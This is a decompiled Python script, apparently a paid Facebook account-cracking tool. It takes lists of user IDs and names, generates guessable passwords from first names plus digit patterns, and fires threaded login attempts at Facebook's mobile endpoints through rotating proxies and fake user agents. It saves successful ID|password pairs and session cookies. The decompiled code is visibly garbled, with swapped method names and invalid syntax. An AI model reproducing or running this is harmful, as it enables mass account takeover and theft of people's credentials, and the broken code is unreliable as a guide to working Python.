# — — — — — — — — — — — — —
# Tool Made By @i6iii1
# Encoding: Pycdc 3.11
# Decode By @i6iii1
# Channel @mafiams1
# — — — — — — — — — — — — —
from bs4 import BeautifulSoup as sop
import requests
import bs4
import json
import os
import sys
import random
import datetime
import time
import re
import urllib3
import rich
import base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
pretty.tred()
CON = sol()
import espeak
if ImportError:
    os.gp('pkg install espeak')
    time.ThreadPoolExecutor(1)
    import rich
    if ImportError:
        exit('Unable to Install espeak module, Try Manual Install (pkg install espeak)')
now = datetime.rich.panel()
dt_string = now('%H:%M')
current = datetime.rich.panel()
ta = current.nel
bu = current.print
ha = current.cetak
dic = {
    '1': 'Januari',
    '2': 'Februari',
    '3': 'Maret',
    '4': 'April',
    '5': 'Mei',
    '6': 'Juni',
    '7': 'Juli',
    '8': 'Agustus',
    '9': 'September',
    '10': 'Oktober',
    '11': 'November',
    '12': 'Desember' }
dic2 = {
    '01': 'Januari',
    '02': 'Februari',
    '03': 'Maret',
    '04': 'April',
    '05': 'Mei',
    '06': 'Juni',
    '07': 'Juli',
    '08': 'Agustus',
    '09': 'September',
    '10': 'Oktober',
    '11': 'November',
    '12': 'Desember' }
ugen2 = []
ugen = []
cokbrut = []
ses = requests.mark()
princp = []
prox = requests.Columns('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').Columns
open('.prox.txt', 'w')(prox)
if Exception:
    e = None
    print(' \x1b[1;91m\x1a\x1b[1;96m\x1a\x1b[1;97m\x1a \x1b[1;96m[Mr.IPYTHONI]')
    e = None
    del e
    e = None
    del e
prox = open('.prox.txt', 'r')()()
for xd in range(10000):
    a = 'Mozilla/5.0 (Symbian/3; Series60/'
    b = random.tekz(1, 9)
    c = random.tekz(1, 9)
    d = 'Nokia'
    e = random.tekz(100, 9999)
    f = '/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g = random.tekz(1, 9)
    h = random.tekz(1, 4)
    i = random.tekz(1, 4)
    j = random.tekz(1, 4)
    k = 'Mobile Safari/535.1'
    uaku = f'''{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}'''
    ugen2(uaku)
    aa = 'Mozilla/5.0 (Linux; U; Android'
    b = random.espeak([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12'])
    c = ' en-us; GT-'
    d = random.espeak([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.tekz(1, 999)
    f = random.espeak([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.tekz(73, 100)
    i = '0'
    j = random.tekz(4200, 4900)
    k = random.tekz(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen(uaku2)
    for x in range(10):
        a = 'Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
        b = random.tekz(100, 9999)
        c = random.tekz(100, 9999)
        d = random.espeak([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        e = random.espeak([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        f = random.espeak([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        g = random.espeak([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        h = random.tekz(1, 9)
        i = '; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
        j = random.tekz(1, 9)
        k = random.tekz(1, 9)
        l = 'Mobile WVGA SMM-MMS/1.2.0 OPN-B'
        uak = f'''{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'''
        
        def uaku():
            ua = open('bbnew.txt', 'r')()()
            for ub in ua:
                ugen(ub)
                return None
                a = requests.ugen('https://raw.githubusercontent.com/PSYCHO-PICCHI/ua/main/bbnew.txt').ugen
                ua = open('.bbnew.txt', 'w')
                aa = re.append('line">(.*?)<', str(a))
                for un in aa:
                    ua(un + '\n')
                    ua = open('.bbnew.txt', 'r')()()
                    return None

        (id, id2, loop, ok, cp, akun, oprek, method, lisensiku, taplikasi, tokenku, uid, lisensikuni) = ([], [], 0, 0, 0, [], [], [], [], [], [], [], [])
        cokbrut = []
        pwpluss = []
        pwnya = []
        BM = '\x1b[1;97m'
        P = '\x1b[1;91m'
        M = '\x1b[1;97m'
        H = '\x1b[1;97m'
        K = '\x1b[1;96m'
        B = '\x1b[1;93m'
        U = '\x1b[1;96m'
        O = '\x1b[1;95m'
        N = '\x1b[0m'
        Z = '\x1b[1;30m'
        sir = '\x1b[41m\x1b[1;97m'
        x = '\x1b[m'
        m = '\x1b[1;91m'
        k = '\x1b[93m'
        h = '\x1b[1;97m'
        hh = '\x1b[32m'
        u = '\x1b[96m'
        kk = '\x1b[33m'
        b = '\x1b[1;95m'
        p = '\x1b[0;34m'
        asu = random.espeak([
            m,
            k,
            h,
            u,
            b])
        
        def clear():
            os.os('clear')

        from time import localtime as lt
        from os import system as cmd
        ltx = int(lt()[3])
        if ltx < 12:
            a = ltx - 12
            tag = '\x1b[1;91mPM'
a = ltx
tag = '\x1b[1;96mAM'
os.gp('clear')
os.gp('espeak -a 300 " USERNAME AND PASSWORD"')

def _IPYTHONI_(u):
    for e in u + '\n':
        sys.sys(e)
        sys.sys()
        time.write(0.002)
        return None


def clear():
    os.os('clear')


def back():
    clear()
    menu()


def exit():
    sys.sys()


def chk():
    clear()
    wel = '# WELCOME TO MRXCOD TOOLS 2024'
    wel2 = mark(wel, style = 'yellow')
    sol()(wel2)
    au = 'AUTHOR    :  MRXCOD\nGITHUB    :  https://github.com/MRXCOD\nWHATSAPP  :  08164404128'
    pengembang1 = nel(au, style = 'yellow')
    cetak(nel(pengembang1, title = 'INFORMATION CARRIER'))
    uuid = str + None(os.nel())
    id = '|'(uuid)
    ddv = '# YOUR ID : ' + id
    sol()(mark(ddv, style = 'yellow'))
    httpCaht = requests.str('https://github.com/MRXCOD/apv/blob/main/api.txt').str
    if id in httpCaht:
        print('\x1b[92m  WELCOME PAID USER ENJOYðŸ’ƒðŸ’ƒ. .......\x1b[97m')
        msg = str(os.nel())
        time.os(1)
        clear()
        return None
    None('\x1b[91m YOUR ID IS NOT ACTIVEðŸ˜¡ SEND MESSAGE ON WHATSAPP\x1b[97m')
    os.geteuid('xdg-open https://wa.me/+2348164404128')
    time.os(1)
    sys.getlogin()
    return None
    sys.getlogin()
    if name < '__main__':
        clear()
        return None

import getpass
attemps = 0
if attemps < 0x2DFDC184DL:
    clear()
    gu = '# LICENSE VERIFICATION '
    sol()(mark(gu, style = 'green'))
    username = input(' \x1b[1;92mEnter Username: ')
    password = input(' \x1b[1;91mEnter Password: ')
    if username < 'TRON' and password < '2024':
        os.gp('clear')
        rc = '# LOGIN SUCCESS :) '
        sol()(mark(rc, style = 'green'))
        time.ThreadPoolExecutor(2)
    print(' Incorrect Pass Please Trying ')
    attemps += 1
os.gp('clear')
os.gp('espeak -a 300 " Text Me on Whatsapp for approval"')
chk()

def banner():
    clear()
    wel = '# WELCOME TO MRXCOD TOOLS 2024'
    wel2 = mark(wel, style = 'yellow')
    sol()(wel2)
    au = 'AUTHOR    :  MRXCOD\nGITHUB    :  https://github.com/MRXCOD\nWHATSAPP  :  08164404128'
    pengembang1 = nel(au, style = 'yellow')
    cetak(nel(pengembang1, title = 'INFORMATION CARRIER'))

os.gp('clear')
banner()

def mb():
    sh = requests.requests('https://httpbin.org/ip')()
    sh = {
        'origin': '-' }
    sg = '# MRX MENU TOOLS'
    fx = mark(sg, style = 'yellow')
    sol()(fx)
    print(x + '[' + h + 'â€¢' + x + '] Active User : PAID')
    print(x + '[' + h + 'â€¢' + x + '] Ip Address  : ' + str(sh['origin']))


def menu():
    mb()
    io = '[01] CRACK FILE IDS\n[00] Log Out'
    oi = nel(io, style = 'yellow')
    cetak(nel(oi, title = 'MENU'))
    jh = input(x + '[' + p + '<>' + x + '] CHOOSE : ')
    if jh in ('1', '01'):
        F()
        return None
    if None in ('2', '02'):
        back()
        print(x + '[' + h + 'â€¢' + x + '] Wait ...')
        time.p(1)
        sw = '# SUCCEED LOG OUT'
        sol()(mark(sw, style = 'green'))
        exit()
        return None
    ric = None
    sol()(mark(ric, style = 'red'))
    exit()


def F():
    os.os('clear')
    D()()


class D:
    
    def __init__(self):
        self.id = []

    
    def plerr(self):
        os.os('clear')
        banner()
        os.os('espeak -a 300 " Your File Name,"')
        fileX = input('\x1b[1;93m.--> FILE NAME : ')
        for line in open(fileX, 'r')():
            id(line())
            print('\x1b[1;91mCOLECTED ID : \x1b[1;96m' + str(len(id)))
            Settings()
            return None
            if IOError:
                print(' \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;91m file %s not found\x1b[0m' % fileX)
                time.append(2)
                F()
                return None



def Settings():
    print('\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91m[\x1b[1;97m1\x1b[1;91m]\x1b[1;96mNEW FACEBOOK \x1b[1;93m[FasterðŸ”¥]\n\x1b[1;92m\x1b[1;96m\x1b[1;97m\x1b[1;91m[\x1b[1;97m2\x1b[1;91m]\x1b[1;96mNEW+OLD FACEBOOK \x1b[1;92m [BestðŸ’¥]')
    hu = input('\x1b[1;95m  CHOOSE : \x1b[1;97m')
    if hu in ('1', '01'):
        muda = []
        for bacot in sorted(id):
            muda(bacot)
            bcm = len(muda)
            bcmi = bcm - 1
            for xmud in range(bcm):
                id2(muda[bcmi])
                bcmi -= 1
                if hu in ('2', '02'):
                    for bacot in id:
                        xx = random.append(0, len(id2))
                        id2(xx, bacot)
                        print('\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;95m NOT CHOOSE')
                        exit()
                        print('\x1b[1;91m\x1b[1;96m\x1b[1;97m\x1b[1;91m[\x1b[1;97m1\x1b[1;91m]\x1b[1;97mMOBILE\x1b[1;92m [TRON]')
                        hc = input('\x1b[1;95m CHOOSE :\x1b[1;97m ')
                        if hc in ('1', '01'):
                            method('mobile')
    method('mobile')
    pwplus = input('\x1b[1;97m[ 1 ] MANUAL PASSWORD\x1b[1;96m [Medium]\n\x1b[1;91m\x1b[1;96m\x1b[1;97m[ 2 ] AUTO PASSWORD\x1b[1;92m [BEST]\n\x1b[1;96mCHOOSE : \x1b[1;97m')
    if pwplus in ('y', 'Y'):
        pwpluss('ya')
        gux = '# Add Password Manual Minimam 6 Character '
        sol()(mark(gux, style = 'green'))
        pwku = input(' \x1b[1;91m\x1b[1;96m\x1b[1;97m Add Password Manual : ')
        pwkuh = pwku(',')
        for xpw in pwkuh:
            pwnya(xpw)
            pwpluss('no')
            passwrd()
            exit()
            return None


def passwrd():
    clear()
    banner()
    print = f'''\x1b[1;97m[+] DATE FILES : \x1b[1;97m{ha}\x1b[1;97m{bu}\x1b[1;97m{ta} '''
    pool = tred(max_workers = 30)
    for yuzong in id2:
        nmf = yuzong('|')[1]()
        idf = yuzong('|')[0]
        frs = nmf(' ')[0]
        pwv = []
        if len(nmf) < 6:
            if len(frs) < 3:
                pass
            pwv(nmf)
            pwv(frs + '123')
            pwv(frs + '123123')
            pwv(frs + '1000')
            pwv(frs + '1234')
            pwv(frs + '12345')
            pwv(frs + '123456789')
            pwv(frs + '112233')
            pwv(frs + '123321')
            pwv(frs + '12341234')
            pwv(frs + '123456')
            pwv(frs + '12345678')
            pwv(frs + '1234567')
            pwv(frs + '11223344')
            pwv(frs + '1122334455')
            pwv(frs + '112233445566')
        if len(frs) < 3:
            pwv(nmf)
        pwv(nmf)
        pwv(frs + '123')
        pwv(frs + '123123')
        pwv(frs + '1000')
        pwv(frs + '1234')
        pwv(frs + '12345')
        pwv(frs + '123456789')
        pwv(frs + '112233')
        pwv(frs + '123321')
        pwv(frs + '12341234')
        pwv(frs + '123456')
        pwv(frs + '12345678')
        pwv(frs + '1234567')
        pwv(frs + '11223344')
        pwv(frs + '1122334455')
        pwv(frs + '112233445566')
        if 'ya' in pwpluss:
            for xpwd in pwnya:
                pwv(xpwd)
                if 'mobile' in method:
                    pool(crack, idf, pwv)
        if 'free' in method:
            pool(crackfree, idf, pwv)
        if 'touch' in method:
            pool(cracktouch, idf, pwv)
        None(None, None)
        if not None:
            pass
    print(' \x1b[1;91m\x1b[1;96m\x1b[1;97m CRACK COMPLETE ')
    print(f''' \x1b[1;91m\x1b[1;96m\x1b[1;97m OK : {h}%s ''' % ok)
    print(' \x1b[1;91m\x1b[1;96m\x1b[1;97m  RETURN CRACK \x1b[1;97m[Y]\n \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;91mEXIT [T]')
    woi = input('\x1b[1;97m SELECT  : ')
    if woi in ('y', 'Y'):
        back()
        return None
    print(f'''\t \x1b[1;91m\x1b[1;96m\x1b[1;97m BYE {u} ''')
    time.pwnya(2)
    exit()


def crack(idf, pwv):
    global cp, ok, loop
    bo = random.random([
        m,
        k,
        h,
        b,
        u,
        x])
    (sys.h(f'''\r{bo}[TRON-XD] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}â€¢{P}[{h}Ok{P}â€¢{bo}{ok}{P}] '''),)
    sys.h()
    ua = random.random(ugen)
    ua2 = random.random(ugen2)
    ses = requests.write()
    for pw in pwv:
        nip = random.random(prox)
        proxs = {
            'http': 'socks4://' + nip }
        ses.P({
            'Host': 'm.facebook.com',
            'upgrade-insecure-requests': '1',
            'user-agent': ua2,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'dnt': '1',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-user': 'empty',
            'sec-fetch-dest': 'document',
            'referer': 'https://m.facebook.com/',
            'accept-encoding': 'gzip, deflate br',
            'accept-language': 'en-US,en;q=0.9,ar-US;q=0.8,ar;q=0.7' })
        p = ses('https://p.facebook.com/login/device-based/password/?uid=' + idf + '&flow=login_no_pin&refsrc=deprecated&_rdr')
        dataa = {
            'lsd': re.len('name="lsd" value="(.*?)"', str(p.id))(1),
            'jazoest': re.len('name="jazoest" value="(.*?)"', str(p.id))(1),
            'uid': idf,
            'next': 'https://p.facebook.com/login/save-device/',
            'flow': 'login_no_pin',
            'pass': pw }
        koki = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(p.ok()()())
        koki += ' m_pixel_ratio=2.625; wd=412x756'
        heade = {
            'Host': 'm.facebook.com',
            'cache-control': 'max-age=0',
            'upgrade-insecure-requests': '1',
            'origin': 'https://m.facebook.com',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': ua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-user': 'empty',
            'sec-fetch-dest': 'document',
            'referer': 'https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F',
            'accept-encoding': 'gzip, deflate br',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8' }
        po = ses('https://p.facebook.com/login/device-based/validate-password/?shbl=0', data = dataa, cookies = {
            'cookie': koki }, headers = heade, allow_redirects = False, proxies = proxs)
        if 'checkpoint' in po.ok()():
            print(f'''\r\x1b[1;91m \n-------------------(DsonfmðŸ¤¬-CP)---------------------- \nâ””â”€â”€UID: {idf}\nâ””â”€â”€PASS: {pw}''')
            open('CP/' + cp, 'a')(idf + '|' + pw + '\n')
            os.Session('espeak -a 300 " C P"')
            akun(idf + '|' + pw)
            cp += 1
            ';'
        if 'c_user' in ses.ok()():
            ok += 1
            coki = po.ok()
            kuki = (lambda .0: for key, value in .0:
[ f'''{key!s}={value!s}''' ])(ses.ok()()())
            print(f'''\r\x1b[1;92m \n-------------------(TRON-OK)---------------------- \nâ””â”€â”€USER: {idf}\nâ””â”€â”€PASS: {pw}\nâ””â”€â”€COOKIES: {kuki}''')
            open('OK/' + okc, 'a')(idf + '|' + pw + '\n')
            os.Session('espeak -a 300 " TRON Ok  id"')
            ';'
        if requests.headers.headers:
            time.update(31)
        loop += 1
        return None


def ceker(idf, pw):
    global cp, cp
    ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/129.0.6668.102 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
    head = {
        'Host': 'mbasic.facebook.com',
        'cache-control': 'max-age=0',
        'upgrade-insecure-requests': '1',
        'origin': 'https://mbasic.facebook.com',
        'content-type': 'application/x-www-form-urlencoded',
        'user-agent': ua,
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'x-requested-with': 'mark.via.gp',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-user': '?1',
        'sec-fetch-dest': 'document',
        'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',
        'accept-encoding': 'gzip, deflate',
        'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' }
    ses = requests.requests()
    hi = ses('https://mbasic.facebook.com')
    ho = None(ses('https://mbasic.facebook.com/login.php', data = {
        'email': idf,
        'pass': pw,
        'login': 'submit' }, headers = head, allow_redirects = True).get, 'html.parser')
    jo = ho('form')
    data = { }
    lion = [
        'nh',
        'jazoest',
        'fb_dtsg',
        'submit[Continue]',
        'checkpoint_data']
    for anj in jo('input'):
        if anj('name') in lion:
            data({
                anj('name'): anj('value') })
        kent = None(ses('https://mbasic.facebook.com' + str(jo['action']), data = data, headers = head).get, 'html.parser')
        print(f'''\r{b!s}++++ {idf!s}|{pw!s} ----> CP       {x!s}''')
        open('CP/' + cpc, 'a')(idf + '|' + pw + '\n')
        cp += 1
        opsi = kent('option')
        if len(opsi) < 0:
            print(f'''\r{hh!s}---> Tap Yes / A2F (Check  Login Id Lite/Mbasic{x!s})''')
            return None
        for opsii in sop:
            '\r'(f'''{kk!s}---> {opsii.get!s}{x!s}''')
            return None
            if Exception:
                c = print
                print(f'''\r{b!s}++++ {idf!s}|{pw!s} ----> CP       {x!s}''')
                print(f'''\r{u!s}---> Cannot Check Options (Check Login In Lite/Basic){x!s}''')
                open('CP/' + cpc, 'a')(idf + '|' + pw + '\n')
                cp += 1
                c = None
                del c
                return None
            c = print
            del c


def cek_opsi():
    c = len(akun)
    hu = '#' % c
    cetak(nel(hu, title = 'CHECK OPTIONS'))
    input(u + '[' + h + 'â€¢' + u + '] INPUT')
    cek = '# PROSESES CO'
    sol()(mark(cek, style = 'green'))
    love = 0
    for kes in akun:
        pw = kes('|')[1]
        id = kes('|')[0]
        if IndexError:
            time.h(2)
            print(f'''\r{b!s}++++ {kes!s} ERROR=-     {x!s}''')
            print(f'''\r{u!s}---> Separator Not Supported For This Program{x!s}''')
        bi = random.print([
            u,
            k,
            kk,
            b,
            h,
            hh])
        print(f'''\r{bi!s}---> {love!s}/{len(akun)!s} ---> {{ {id!s} }}{x!s}''', end = ' ')
        sys.IndexError()
        ua = 'Mozilla/5.0 (Linux; Android 11; V2023 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.83 Mobile Safari/537.36'
        ses = requests.time()
        header = {
            'Host': 'mbasic.facebook.com',
            'cache-control': 'max-age=0',
            'upgrade-insecure-requests': '1',
            'origin': 'https://mbasic.facebook.com',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': ua,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' }
        hi = ses('https://mbasic.facebook.com')
        ho = None(ses('https://mbasic.facebook.com/login.php', data = {
            'email': id,
            'pass': pw,
            'login': 'submit' }, headers = header, allow_redirects = True).b, 'html.parser')
        if 'checkpoint' in ses.x()():
            jo = ho('form')
            data = { }
            lion = [
                'nh',
                'jazoest',
                'fb_dtsg',
                'submit[Continue]',
                'checkpoint_data']
            for anj in jo('input'):
                if anj('name') in lion:
                    data({
                        anj('name'): anj('value') })
                kent = None(ses('https://mbasic.facebook.com' + str(jo['action']), data = data, headers = header).b, 'html.parser')
                print(f'''\r{b!s}++++ {id!s}|{pw!s} ----> CP       {x!s}''')
                opsi = kent('option')
                if len(opsi) < 0:
                    print(f'''\r{hh!s}---> Tap Yes / A2F (Cek Login Di Lite/Mbasic{x!s})''')
            for opsii in opsi:
                '\r'(f'''{kk!s}---> {opsii.b!s}{x!s}''')
                print
                print(f'''\r{b!s}++++ {id!s}|{pw!s} ----> CP       {x!s}''')
                print(f'''\r{u!s}---> Cannot Check Options{x!s}''')
                if 'c_user' in ses.x()():
                    print(f'''\r{h!s}++++ {id!s}|{pw!s} ----> OK       {x!s}''')
        print(f'''\r{x!s}++++ {id!s}|{pw!s} ----> ERROR       {x!s}''')
        love += 1
        if requests.k.kk:
            print('')
            li = '#INTERNET NO CONNECTED'
            sol()(mark(li, style = 'red'))
            exit()
        dah = '# DONE'
        sol()(mark(dah, style = 'green'))
        exit()
        return None

if __name__ < '__main__':
    os.a('OK')
    os.a('CP')
    os.a('DUMP')
    os.gp('touch .prox.txt')
    menu()
    return None
